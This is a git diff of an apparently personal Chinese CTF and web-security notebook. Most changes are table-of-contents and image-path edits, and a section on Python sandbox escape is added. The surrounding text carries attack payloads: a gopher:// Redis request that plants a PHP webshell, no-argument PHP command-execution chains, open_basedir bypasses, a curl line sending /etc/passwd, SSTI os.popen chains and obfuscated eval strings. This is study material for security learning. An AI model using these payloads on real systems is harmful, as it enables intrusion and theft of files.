@@ -1,4 +1,92 @@
-[TOC]
+* [PHP变量覆盖](#php变量覆盖)
+  * [parse\_str()](#parse_str)
+  * [extract ()](#extract-)
+* [PHP反序列化](#php反序列化)
+  * [PHP反序列化字符串逃逸](#php反序列化字符串逃逸)
+  * [phar反序列化](#phar反序列化)
+    * [将phar伪造成其他格式的文件](#将phar伪造成其他格式的文件)
+    * [绕过phar关键字检测](#绕过phar关键字检测)
+    * [绕过\_\_HALT\_COMPILER特征检测](#绕过__halt_compiler特征检测)
+* [无参数读文件](#无参数读文件)
+  * [查看当前目录文件名](#查看当前目录文件名)
+  * [读取当前目录文件](#读取当前目录文件)
+  * [查看上一级目录文件名](#查看上一级目录文件名)
+  * [读取上级目录文件](#读取上级目录文件)
+  * [查看和读取多层上级路径](#查看和读取多层上级路径)
+  * [查看和读取根目录文件](#查看和读取根目录文件)
+* [无参数命令执行（RCE）](#无参数命令执行rce)
+  * [getallheaders()和apache\_request\_headers()](#getallheaders和apache_request_headers)
+  * [get\_defined\_vars()](#get_defined_vars)
+  * [session\_id()](#session_id)
+  * [getenv()](#getenv)
+* [PHP绕过open\_basedir](#php绕过open_basedir)
+  * [命令执行函数](#命令执行函数)
+  * [symlink()函数](#symlink函数)
+  * [glob伪协议](#glob伪协议)
+    * [glob://伪协议](#glob伪协议-1)
+    * [DirectoryIterator\+glob://](#directoryiteratorglob)
+    * [scandir()\+glob://](#scandirglob)
+    * [opendir()\+readdir()\+glob://](#opendirreaddirglob)
+    * [ini\_set()绕过](#ini_set绕过)
+    * [利用SplFileInfo::getRealPath()类方法绕过](#利用splfileinfogetrealpath类方法绕过)
+    * [realpath()绕过](#realpath绕过)
+    * [imageftbbox()绕过](#imageftbbox绕过)
+    * [bindtextdomain()绕过](#bindtextdomain绕过)
+  * [EXP](#exp)
+* [无数字字母RCE](#无数字字母rce)
+* [PHP WebShell免杀](#php-webshell免杀)
+* [SSRF和Gopher](#ssrf和gopher)
+  * [curl命令行工具](#curl命令行工具)
+  * [SSRF中主要的协议](#ssrf中主要的协议)
+  * [SSRF打redis](#ssrf打redis)
+    * [Gopher](#gopher)
+    * [dict](#dict)
+  * [SSRF打FastCGI](#ssrf打fastcgi)
+    * [消息头(请求头)](#消息头请求头)
+    * [消息体(请求体)](#消息体请求体)
+      * [type为1](#type为1)
+      * [type为3](#type为3)
+      * [type为4](#type为4)
+      * [type值为5,6,7](#type值为567)
+    * [完整消息record](#完整消息record)
+    * [PHP\-FPM（FastCGI进程管理器）](#php-fpmfastcgi进程管理器)
+      * [EXP](#exp-1)
+* [redis漏洞复现](#redis漏洞复现)
+* [Python沙箱逃逸](#python沙箱逃逸)
+  * [花式 import](#花式-import)
+  * [花式处理字符串](#花式处理字符串)
+* [SSTI](#ssti)
+  * [SSTI简介](#ssti简介)
+  * [模板是什么](#模板是什么)
+  * [漏洞成因](#漏洞成因)
+  * [SSTI基础知识](#ssti基础知识)
+      * [Python\-flask模板](#python-flask模板)
+      * [Python中的一些 Magic Method](#python中的一些-magic-method)
+  * [waf绕过](#waf绕过)
+* [Flask框架session伪造](#flask框架session伪造)
+* [Python中@的用法](#python中的用法)
+* [hebust教务系统逆向](#hebust教务系统逆向)
+* [JWT漏洞](#jwt漏洞)
+* [Java安全](#java安全)
+  * [命令执行](#命令执行)
+    * [Windows下](#windows下)
+    * [Linux下](#linux下)
+  * [反射](#反射)
+    * [反射机制原理](#反射机制原理)
+    * [反射机制操作](#反射机制操作)
+      * [获取Class对象](#获取class对象)
+      * [获取成员方法Method](#获取成员方法method)
+        * [invoke()方法](#invoke方法)
+      * [获取构造函数Constructor](#获取构造函数constructor)
+        * [newInstance()方法](#newinstance方法)
+        * [getDeclaredConstructor() 方法的语法如下：](#getdeclaredconstructor-方法的语法如下)
+      * [获取成员变量Field](#获取成员变量field)
+  * [反序列化](#反序列化)
+* [VIM](#vim)
+  * [如何从正常模式进入插入模式呢？](#如何从正常模式进入插入模式呢)
+  * [VIM 的命令模式](#vim-的命令模式)
+  * [VIM 的正常模式](#vim-的正常模式)
+* [Golang](#golang)
 
 ## PHP变量覆盖
 
@@ -51,7 +139,7 @@ echo $arr[1]; // baz
 
 该函数返回成功设置的变量数目。
 
-![image-20230717004044838](README.assets/image-20230717004044838.png)
+![image-20230717004044838](daydayup.assets/image-20230717004044838.png)
 
 https://www.runoob.com/php/func-array-extract.html
 
@@ -149,7 +237,7 @@ O:<length>:"<class name>":<n>:{
 
 
 
-![image-20230717010044564](README.assets/image-20230717010044564.png)
+![image-20230717010044564](daydayup.assets/image-20230717010044564.png)
 
 此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞
 
@@ -199,7 +287,7 @@ print("number:".$fake['number']."\n");
 
 ```
 
-![image-20230717110730005](README.assets/image-20230717110730005.png)
+![image-20230717110730005](daydayup.assets/image-20230717110730005.png)
 
 ### phar反序列化
 
@@ -246,7 +334,7 @@ meta-data是以序列化的形式存储的
 
 php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下
 
-![img](README.assets/1687876180147-90a3db65-cf9b-42a9-adf8-b6acf2582b52-16894035091502.png)
+![img](daydayup.assets/1687876180147-90a3db65-cf9b-42a9-adf8-b6acf2582b52-16894035091502.png)
 
 phar协议要求：
 
@@ -286,7 +374,7 @@ phar协议要求：
 ?>
 ```
 
-![image-20230717012512791](README.assets/image-20230717012512791.png)
+![image-20230717012512791](daydayup.assets/image-20230717012512791.png)
 
 #### 绕过phar关键字检测
 
@@ -316,7 +404,7 @@ php://filter/read=convert.base64-encode/resource=phar://phar.phar
 
 首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了`__HALT_COMPILER()`，将 phar.gz 后缀改为 png（png文件可以上传）
 
-![image-20230717014558838](README.assets/image-20230717014558838.png)
+![image-20230717014558838](daydayup.assets/image-20230717014558838.png)
 
 ```
 filename=phar://pharppp.phar.gz/pharppp.phar
@@ -389,11 +477,11 @@ if __name__ == "__main__":
 
 - `localeconv()`：返回一包含本地数字及货币格式信息的数组。而数组第一项就是`.`
 
-  ![image-20230719173153265](README.assets/image-20230719173153265.png)
+  ![image-20230719173153265](daydayup.assets/image-20230719173153265.png)
 
 - `current()`：返回数组中的单元，默认取第一个值，或者使用`pos(localeconv());`，`pos`是`current`的别名，如果都被过滤还可以使用`reset()`，该函数返回数组第一个单元的值，如果数组为空则返回 `FALSE`
 
-  ![image-20230719173326469](README.assets/image-20230719173326469.png)
+  ![image-20230719173326469](daydayup.assets/image-20230719173326469.png)
 
 - `chr(46)`就是字符`.`
 
@@ -408,11 +496,11 @@ if __name__ == "__main__":
 
   `chr(time())`：`chr()`函数以256为一个周期，所以`chr(46)`,`chr(302)`,`chr(558)`都等于`.`，所以使用`chr(time())`，一个周期必定出现一次`.`
 
-  ![image-20230719173621207](README.assets/image-20230719173621207.png)
+  ![image-20230719173621207](daydayup.assets/image-20230719173621207.png)
 
   `chr(current(localtime(time())))`：数组第一个值每秒+1，所以最多60秒就一定能得到46，用`current`或者`pos`就能获得`.`
 
-  ![image-20230719173926887](README.assets/image-20230719173926887.png)
+  ![image-20230719173926887](daydayup.assets/image-20230719173926887.png)
 
 - `phpversion()`：返回PHP版本，如`5.5.9`
 
@@ -438,13 +526,13 @@ if __name__ == "__main__":
 
   `print_r(scandir(chr(ord(hebrevc(crypt(time()))))));//（多刷新几次）`
 
-  ![image-20230719182620374](README.assets/image-20230719182620374.png)
+  ![image-20230719182620374](daydayup.assets/image-20230719182620374.png)
 
   同理：`strrev(crypt(serialize(array())))`也可以得到`"."`，只不过`crypt(serialize(array()))`的点出现在最后一个字符，需要使用`strrev()`逆序，然后使用`chr(ord())`获取第一个字符
 
   `print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));`
 
-  ![image-20230719183135310](README.assets/image-20230719183135310.png)
+  ![image-20230719183135310](daydayup.assets/image-20230719183135310.png)
 
   PHP的函数如此强大，获取`"."`的方法肯定还有许多
 
@@ -456,7 +544,7 @@ if __name__ == "__main__":
 
 ### 读取当前目录文件
 
-![image-20230719184112763](README.assets/image-20230719184112763.png)
+![image-20230719184112763](daydayup.assets/image-20230719184112763.png)
 
 `show_source(end(scandir(getcwd())));`或者用`readfile`、`highlight_file`、`file_get_contents` 等读文件函数都可以（使用`readfile`和`file_get_contents`读文件，显示在源码处）
 
@@ -499,7 +587,7 @@ ps：`readgzfile()`也可读文件，常用于绕过过滤
 
 `dirname()` ：返回路径中的目录部分，比如：
 
-![image-20230719190241851](README.assets/image-20230719190241851.png)
+![image-20230719190241851](daydayup.assets/image-20230719190241851.png)
 
 如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径
 
@@ -523,7 +611,7 @@ ps：`readgzfile()`也可读文件，常用于绕过过滤
 
 前面写到了`chdir()`，使用：`show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));`即可改变当前目录为上一层目录并读取文件：
 
-![image-20230720172405756](README.assets/image-20230720172405756.png)
+![image-20230720172405756](daydayup.assets/image-20230720172405756.png)
 
 如果不能使用`dirname()`，可以使用构造`..`的方式切换路径并读取：
 
@@ -546,26 +634,26 @@ show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scand
 **查看多层上级路径：**
 
 `scandir(dirname(chdir(next(scandir(dirname(chdir(dirname(getcwd()))))))));`
-![image-20230720172811801](README.assets/image-20230720172811801.png)
+![image-20230720172811801](daydayup.assets/image-20230720172811801.png)
 
 `scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(current(localeconv()))))))))))))))));` 要刷新很久，建议配合burp爆破使用
-![image-20230720175902183](README.assets/image-20230720175902183.png)
+![image-20230720175902183](daydayup.assets/image-20230720175902183.png)
 
 **读取多层上层路径文件：**
 
 `array_rand(array_flip(scandir(dirname(chdir(next(scandir(dirname(chdir(dirname(getcwd()))))))))));`
-![image-20230720172840411](README.assets/image-20230720172840411.png)
+![image-20230720172840411](daydayup.assets/image-20230720172840411.png)
 
 `array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(current(localeconv()))))))))))))))))));`		建议配合burp爆破使用
 
-![image-20230720180542945](README.assets/image-20230720180542945.png)
+![image-20230720180542945](daydayup.assets/image-20230720180542945.png)
 
 ### 查看和读取根目录文件
 
 `hebrevc(crypt(arg))`或`crypt(arg)`所生成的字符串最后一个字符有几率是`/`，再用`strrev()`反转再获取第一位字符就有几率获得`/`（读根目录文件需要有权限）
 
 `chr(ord(strrev(hebrevc(crypt(time())))))`
-![image-20230720182030861](README.assets/image-20230720182030861.png)
+![image-20230720182030861](daydayup.assets/image-20230720182030861.png)
 
 同样的：
 
@@ -595,7 +683,7 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
 
 首先想到请求头参数`headers`，因为`headers`我们用户可控
 
-![image-20230720205606433](README.assets/image-20230720205606433.png)
+![image-20230720205606433](daydayup.assets/image-20230720205606433.png)
 
 
 
@@ -605,18 +693,18 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
 
 先查看哪个参数在第一位，然后直接修改第一位的`header`参数为payload，然后选择到它执行即可。
 
-![image-20230720205743373](README.assets/image-20230720205743373-16898578643871.png)
+![image-20230720205743373](daydayup.assets/image-20230720205743373-16898578643871.png)
 
 `system(next(getallheaders()))`
-![image-20230720210218241](README.assets/image-20230720210218241.png)
-![image-20230720210359355](README.assets/image-20230720210359355.png)
+![image-20230720210218241](daydayup.assets/image-20230720210218241.png)
+![image-20230720210359355](daydayup.assets/image-20230720210359355.png)
 
 ### get\_defined\_vars()
 
 该函数会返回全局变量的值，如get、post、cookie、file数据，返回一个多维数组，所以需要使用两次取数组值：
 
-![image-20230720210916892](README.assets/image-20230720210916892.png)
-![image-20230720211215175](README.assets/image-20230720211215175.png)
+![image-20230720210916892](daydayup.assets/image-20230720210916892.png)
+![image-20230720211215175](daydayup.assets/image-20230720211215175.png)
 
 ```
 system(current(next(get_defined_vars())))
@@ -652,12 +740,12 @@ system(current(next(get_defined_vars())))
 >    print(r.text)
 >```
 >
->![image-20230720220418361](README.assets/image-20230720220418361.png)
+>![image-20230720220418361](daydayup.assets/image-20230720220418361.png)
 
 这里要注意的是，file数组在最后一个，需要end定位，因为payload直接放在文件的名称上，再pos两次定位获得文件名
 
 `print_r(system(pos(current(end(get_defined_vars())))))`
-![image-20230720220701015](README.assets/image-20230720220701015.png)
+![image-20230720220701015](daydayup.assets/image-20230720220701015.png)
 
 ### session_id()
 
@@ -671,19 +759,19 @@ session需要使用`session_start()`开启，然后返回参数给`session_id()`
 
 `if(session_start())var_dump(eval(hex2bin(session_id())));`
 
-![image-20230720224417366](README.assets/image-20230720224417366.png)
+![image-20230720224417366](daydayup.assets/image-20230720224417366.png)
 
 >PHP7.3.4只能用这种方式来实现，PHP5可以不使用if而是把`session_start()`嵌套在`session_id()`里面
 >
 >PHP7.3.4
->![image-20230720224449551](README.assets/image-20230720224449551.png)
+>![image-20230720224449551](daydayup.assets/image-20230720224449551.png)
 >
 >PHP5.4.45
 >`var_dump(eval(hex2bin(session_id(session_start()))));`
->![image-20230720224842929](README.assets/image-20230720224842929.png)
+>![image-20230720224842929](daydayup.assets/image-20230720224842929.png)
 >
 >而PHP7.3.4使用嵌套方式`session_id()`就会返回`false`
->![image-20230720225131291](README.assets/image-20230720225131291.png)
+>![image-20230720225131291](daydayup.assets/image-20230720225131291.png)
 >
 >初步判定是因为`session_start()`开启成功后会返回1，导致`session_id()`内有参数，让PHP以为是要修改PHPSESSID，从而导致无法获取到PHPSESSID
 
@@ -701,15 +789,15 @@ session需要使用`session_start()`开启，然后返回参数给`session_id()`
 
 也就是说系统在定义PHP预定义变量时的顺序是 `GET,POST,COOKIES,SERVER`，没有定义`Environment(E)`，你可以修改`php.ini`文件的 `variables_order`值为你想要的顺序，如：`"EGPCS"`。这时，`$_ENV`的值就可以取得了
 
-![](README.assets/format,png-168951187500036.png)
+![](daydayup.assets/format,png-168951187500036.png)
 
 我们来看修改后的值：（环境不同，环境变量显示也不同）
 
-![](README.assets/format,png-168951187500137.png)
+![](daydayup.assets/format,png-168951187500137.png)
 
 对此我们可以加以利用，方法同上文：
 
-![](README.assets/format,png-168951187500138-16898684188512.png)
+![](daydayup.assets/format,png-168951187500138-16898684188512.png)
 
 ## PHP绕过open_basedir
 
@@ -737,11 +825,11 @@ pen_basedir是php.ini中的一个配置选项，它可将用户访问文件的�
 由于open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。
 
 当我们设置好open_basedir之后，通过`file_get_contents()`去读取其他目录的文件，执行效果如图
-![image-20230722160854725](README.assets/image-20230722160854725.png)
+![image-20230722160854725](daydayup.assets/image-20230722160854725.png)
 
 很明显我们无法直接读取open_basedir所规定以外的目录文件。接下来通过`system()`来实现相同的功能
 
-![image-20230722161517469](README.assets/image-20230722161517469.png)
+![image-20230722161517469](daydayup.assets/image-20230722161517469.png)
 
 通过命令执行函数绕过open_basedir来读取flag，由于命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制。
 
@@ -781,13 +869,13 @@ open_bashedir配置：`open_basedir = /var/www/html/`
 
 接着在/var/www/中新建一个flag文件内容为`flag{Hack!}`
 
-![image-20230722181700956](README.assets/image-20230722181700956.png)
+![image-20230722181700956](daydayup.assets/image-20230722181700956.png)
 
 正常读一下内容
-![image-20230722182048849](README.assets/image-20230722182048849-16900212512641.png)
+![image-20230722182048849](daydayup.assets/image-20230722182048849-16900212512641.png)
 
 执行刚才写好的脚本
-![image-20230722182428909](README.assets/image-20230722182428909.png)
+![image-20230722182428909](daydayup.assets/image-20230722182428909.png)
 
 成功读取到flag，绕过了open_opendir的限制
 
@@ -842,7 +930,7 @@ foreach($a as $f){
 ```
 
 可以看到,成功列出目录:
-![img](README.assets/open_basedir_5.png)
+![img](daydayup.assets/open_basedir_5.png)
 
 当传入的参数为glob:///\*时会列出根目录下的文件，传入参数为glob://\*时会列出open_basedir允许目录下的文件。
 
@@ -856,7 +944,7 @@ var_dump(scandir('glob:///*'));
 >
 ```
 
-![img](README.assets/open_basedir_6.png)
+![img](daydayup.assets/open_basedir_6.png)
 
 这种方法也只能列出根目录和open_basedir允许目录下的文件。
 
@@ -875,7 +963,7 @@ if ( $b = opendir('glob:///*') ) {
 ?>
 ```
 
-![img](README.assets/open_basedir_7.png)
+![img](daydayup.assets/open_basedir_7.png)
 
 同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。
 可以看到，上面三种和glob://相关的协议，最大的缺陷就是只能列目录，而且还只能列根目录和open_basedir允许目录的内容。
@@ -969,7 +1057,7 @@ function dump($s){
 >
 >linux通配符
 >
->![img](README.assets/v2-8ad24c5e1b91a5741444e98851b94b01_r.jpg)
+>![img](daydayup.assets/v2-8ad24c5e1b91a5741444e98851b94b01_r.jpg)
 
 #### realpath()绕过
 
@@ -1256,7 +1344,7 @@ curl -F "file=@/etc/passwd" http://127.0.0.1
    file://文件绝对路径
    ```
 
-   ![image-20230716012047466](README.assets/image-20230716012047466.png)
+   ![image-20230716012047466](daydayup.assets/image-20230716012047466.png)
 
 2. Gopher协议
 
@@ -1290,7 +1378,7 @@ curl -F "file=@/etc/passwd" http://127.0.0.1
 
 #### Gopher
 
-![img](README.assets/1689445890678-9ea0f307-73ec-46e3-ae86-8755a0807333.png)
+![img](daydayup.assets/1689445890678-9ea0f307-73ec-46e3-ae86-8755a0807333.png)
 
 ```c
 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0Agopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
@@ -1298,13 +1386,13 @@ gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0As
 
 payload需要再进行一次url编码
 
-![img](README.assets/1689445973347-88b9dac1-ab6c-4188-9720-47a580066a91.png)
+![img](daydayup.assets/1689445973347-88b9dac1-ab6c-4188-9720-47a580066a91.png)
 
-![img](README.assets/1689445992524-f1c3229a-1074-4b13-9fab-6b3a0573a1dd.png)
+![img](daydayup.assets/1689445992524-f1c3229a-1074-4b13-9fab-6b3a0573a1dd.png)
 
 #### dict
 
-![img](README.assets/1689447145441-17d16e46-64e7-47b2-816d-01835b4399c2.png)
+![img](daydayup.assets/1689447145441-17d16e46-64e7-47b2-816d-01835b4399c2.png)
 
 >```
 >str="<?php system($_GET[\"a\"])?>";
@@ -1331,7 +1419,7 @@ dict://127.0.0.1:6379/save更改rdb文件的目录至网站目录下
 url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
 ```
 
-![img](README.assets/1689447203355-71caa4c3-6179-4e48-a9e3-18b68673f4c8.png)
+![img](daydayup.assets/1689447203355-71caa4c3-6179-4e48-a9e3-18b68673f4c8.png)
 
 ### SSRF打FastCGI
 
@@ -1349,7 +1437,7 @@ url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
 
 [利用SSRF攻击内网FastCGI协议 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/263342.html)
 
-![image-20230715203751325](README.assets/image-20230715203751325.png)
+![image-20230715203751325](daydayup.assets/image-20230715203751325.png)
 
 https://blog.csdn.net/mysteryflower/article/details/94386461
 
@@ -1393,11 +1481,11 @@ type就是指定该record的作用。因为fastcgi一个record的大小是有限
 
 借用[该文章](https://blog.csdn.net/shreck66/article/details/50355729)中的一个表格，列出最主要的几种type：
 
-![img](README.assets/1689422306195-674d037d-fdee-4e2b-aad9-25c4642fd954.png)
+![img](daydayup.assets/1689422306195-674d037d-fdee-4e2b-aad9-25c4642fd954.png)
 
 
 
-下图为php-fpm给web服务器传输的一个具体消息的消息头(8字节)内容![img](README.assets/1689422757350-d1d8efd7-1c1c-4831-a5b3-d39fc7e10e8a.png)
+下图为php-fpm给web服务器传输的一个具体消息的消息头(8字节)内容![img](daydayup.assets/1689422757350-d1d8efd7-1c1c-4831-a5b3-d39fc7e10e8a.png)
 
 1. 序列0(对应version字段)的数值为01，代表php-fpm的版本信息
 2. 序列1(对应type字段)的数值为03，根据上面对type值含义的解释，可以知道这个消息将标志这此次交互的结束
@@ -1424,7 +1512,7 @@ typedef struct
 
 根据上述可知type值为1的消息(标识开始请求)的消息的消息体为固定大小8字节，其中各个字段的具体含义如下
 
-- role:此字段占2个字节，用来说明我们对php-fpm发起请求时，我们想让php-fpm为我们扮演什么角色(做什么，或理解为杂么做)，其常见的3个取值如下:![img](README.assets/1689423015583-dced4942-2ec6-4ce7-acd3-c3bb75d3cada.png)
+- role:此字段占2个字节，用来说明我们对php-fpm发起请求时，我们想让php-fpm为我们扮演什么角色(做什么，或理解为杂么做)，其常见的3个取值如下:![img](daydayup.assets/1689423015583-dced4942-2ec6-4ce7-acd3-c3bb75d3cada.png)
 - flags:字段确定是否与php-fpm建立长连接，为1长连接，为0则在每次请求处理结束之后关闭连接
 - reserved:保留字段
 
@@ -1454,7 +1542,7 @@ typedef struct
 
 此值表示此消息体为传递PARAMS(环境参数)，环境参数其实就是name-value对，我们可以使用自己定义的name-value传给php-fpm或者传递php-fpm已有的name-value对，以下为我们后面实例将会使用到的php-fpm以有的name-value对如下
 
-![img](README.assets/1689423449899-fc1b80a1-4e61-4e8a-bdc3-5addd25581ed.png)
+![img](daydayup.assets/1689423449899-fc1b80a1-4e61-4e8a-bdc3-5addd25581ed.png)
 
 消息体的格式如下
 
@@ -1540,7 +1628,7 @@ typedef struct {
 
 #### 完整消息record
 
-![img](README.assets/1689423582373-16f2051e-9c9e-49f9-a701-6710e752ae90.png)
+![img](daydayup.assets/1689423582373-16f2051e-9c9e-49f9-a701-6710e752ae90.png)
 
 #### PHP-FPM（FastCGI进程管理器）
 
@@ -1863,7 +1951,47 @@ python沙箱逃逸（pyjail），是CTF中一类题的通称：在这些题目�
 
 ### 花式 import
 
+1. `import os`可以，中间的空格输入几个都可以，`import   os`
 
+2. `__import__`：`__import__('os')`
+
+3.  `importlib`：`importlib.import_module('os').system('ls')`
+
+4. 也可以直接执行一遍需要导入的库进行导入
+
+   `Python2.x`
+
+   ```python
+   execfile('/usr/lib/python2.7/os.py')
+   system('ls')
+   ```
+
+   `Python2.x`和`Python3.x`通用
+
+   ```python
+   with open('/usr/lib/python3.9/os.py') as f:
+       exec(f.read())
+   system('ls')
+   ```
+
+   不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 `sys `没被干掉的话，还可以确认一下
+
+   ```python
+   import sys
+   print(sys.path)
+   ```
+
+### 花式处理字符串
+
+倒置，base编码，hex，字符串拼接，在通过利用`eval`或者`exec`
+
+- `__import__('so'[::-1]).system('dir')`
+- `eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])`
+- `eval(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2Rpcicp').decode('utf-8'))`
+- `eval(b'1'.fromhex('5f5f696d706f72745f5f28276f7327292e73797374656d28276469722729').decode('utf-8'))`
+- `eval(bytes.fromhex('5f5f696d706f72745f5f28276f7327292e73797374656d28276469722729').decode('utf-8'))`
+- `a='o';b='s';__import__(a+b).system('dir')`
+- 
 
 ## SSTI
 
@@ -2002,7 +2130,7 @@ if __name__ == "__main__":
 
 ```
 
-![image-20230729181809015](README.assets/image-20230729181809015.png)
+![image-20230729181809015](daydayup.assets/image-20230729181809015.png)
 
 ```
 <class 'os._wrap_close'>类：
@@ -2032,18 +2160,18 @@ os模块执行命令:
 在已经加载os模块的子类里直接调用os模块：''.__class__.__bases__[0].__subclasses__()[341].__init__.__globals__['os'].popen("ls -l").read()
 ```
 
-`subprocess.Popen()`![image-20230729180632010](README.assets/image-20230729180632010.png)
+`subprocess.Popen()`![image-20230729180632010](daydayup.assets/image-20230729180632010.png)
 
 `os.system()`
-![image-20230729182735682](README.assets/image-20230729182735682.png)
+![image-20230729182735682](daydayup.assets/image-20230729182735682.png)
 
 `linecache()`执行命令
-![image-20230729191643448](README.assets/image-20230729191643448.png)
+![image-20230729191643448](daydayup.assets/image-20230729191643448.png)
 
-![image-20230729192011745](README.assets/image-20230729192011745.png)
+![image-20230729192011745](daydayup.assets/image-20230729192011745.png)
 
 解析`{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}`
-![image-20230729184733593](README.assets/image-20230729184733593.png)
+![image-20230729184733593](daydayup.assets/image-20230729184733593.png)
 
 >`__class__.__base__.__subclasses__()` 列表中通常不会包含 `file` 类的子类，因为在 Python 3 中，`file` 类已经被移除，不再是内置类型。
 >
@@ -2379,10 +2507,10 @@ Class c = new Class()；
 ```
 
 答案是不行的，所以我们查看一下Class的源码，发现他的构造器是私有的，这意味着只有JVM可以创建Class的对象。
-![image-20230722003643653](README.assets/image-20230722003643653.png)
+![image-20230722003643653](daydayup.assets/image-20230722003643653.png)
 
 反射机制原理就是把Java类中的各种成分映射成一个个的Java对象，所以我们可以在运行时调用类中的所有成员（变量、方法）。下图是反射机制中类的加载过程：
-![img](README.assets/v2-12ed9f48c94e5e2a3c63b2ed9bc964b9_r.jpg)
+![img](daydayup.assets/v2-12ed9f48c94e5e2a3c63b2ed9bc964b9_r.jpg)
 
 #### 反射机制操作
 
@@ -2396,7 +2524,7 @@ Class c = new Class()；
 > 3. 如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委派机制
 >
 > 4. 父类加载器一层一层往下分配任务，如果子类加载器能加载，则加载此类，如果将加载任务分配至系统类加载器也无法加载此类，则抛出异常
->    ![img](README.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvZGV5YW5iYW8=,size_16,color_FFFFFF,t_70.png)
+>    ![img](daydayup.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvZGV5YW5iYW8=,size_16,color_FFFFFF,t_70.png)
 
 ##### 获取Class对象
 
@@ -2406,7 +2534,7 @@ Class c = new Class()；
 2. 任何数据类型（包括基本数据类型）都有一个“静态”的Class属性，所以直接调用.class属性获得Class对象
 3. 调用Class类的forName方法，获得Class的对象
 
-![image-20230722003946555](README.assets/image-20230722003946555.png)
+![image-20230722003946555](daydayup.assets/image-20230722003946555.png)
 
 ##### 获取成员方法Method
 
@@ -2421,7 +2549,7 @@ Class c = new Class()；
 >`Method method = class.getDeclaredMethod("方法名");`
 >`Method[] method = class.getDeclaredMethod("方法名", 参数类型如String.class，多个参数用,号隔开);`
 
-![image-20230722005912022](README.assets/image-20230722005912022.png)
+![image-20230722005912022](daydayup.assets/image-20230722005912022.png)
 
 执行方法：`Process process = (Process) runtimeMethod.invoke(runtimeInstance, "calc");`
 
@@ -2459,7 +2587,7 @@ Class c = new Class()；
 >
 >你会得到这样一个错误：
 >
->![image-20230728171457674](README.assets/image-20230728171457674.png)
+>![image-20230728171457674](daydayup.assets/image-20230728171457674.png)
 >
 > 原因是 Runtime 类的构造方法是私有的。
 >
@@ -2625,7 +2753,7 @@ Class c = new Class()；
 >```
 >
 
-![image-20230722135218913](README.assets/image-20230722135218913.png)
+![image-20230722135218913](daydayup.assets/image-20230722135218913.png)
 
 `getDeclaredConstructor()`可以获得构造方法，也可以获得我们常用的`private`方法，其中`Runtime`的构造方法是`private`，我们无法直接调用，我们需要使用反射去修改方法的访问权限（使用`setAccessible`，修改为 true），再通过获取的构造器进行实例化对象
 
@@ -2663,7 +2791,7 @@ Object runtimeInstance = constructor.newInstance();
  System.out.println(stuIdNew);
 ```
 
-![image-20230722141131662](README.assets/image-20230722141131662.png)
+![image-20230722141131662](daydayup.assets/image-20230722141131662.png)
 
 上述的完整Payload:
 
